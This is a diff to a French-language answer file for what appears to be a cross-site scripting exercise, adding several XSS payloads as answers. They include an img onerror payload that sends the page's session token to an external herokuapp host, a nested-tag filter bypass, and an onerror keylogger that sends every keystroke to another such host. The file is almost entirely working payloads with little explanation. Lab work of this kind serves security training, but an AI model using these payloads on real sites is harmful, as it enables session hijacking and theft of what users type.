@@ -10,9 +10,21 @@ question 3 : via un fetch sur la session
 
 question 4 : <img src='zzz.jpg' onerror= document.location='sfgdh.html'; ></img> via img on change la location pour une page troll
 
-question 5 : 
+question 5 : <img src="48.jpgp" onerror="let img = document.createElement('img'); img.setAttribute('src','https://my-malicious-website.herokuapp.com?session=' + sessionStorage.getItem('session')), document.body.appendChild(img)">
 
 lvl 3 : 
-question 1 : 
+question 1 :  <im<img>g src="48MIAOU" onerror="alert('GET PROUTED');">
 
- 
+question 2 :     
+<img src="48.jpg" onerror="
+    let key = '';             
+    document.onkeypress = function (e) {
+        key += e.key;
+        let req = new XMLHttpRequest();
+        req.open('GET','https://my-malicious-website-coutard.herokuapp.com/data=' + key, true); 
+        req.setRequestHeader('Access-Control-Allow-Origin', '*');
+    req.send('data=' + key);                
+    }   
+
+
+CSRF :
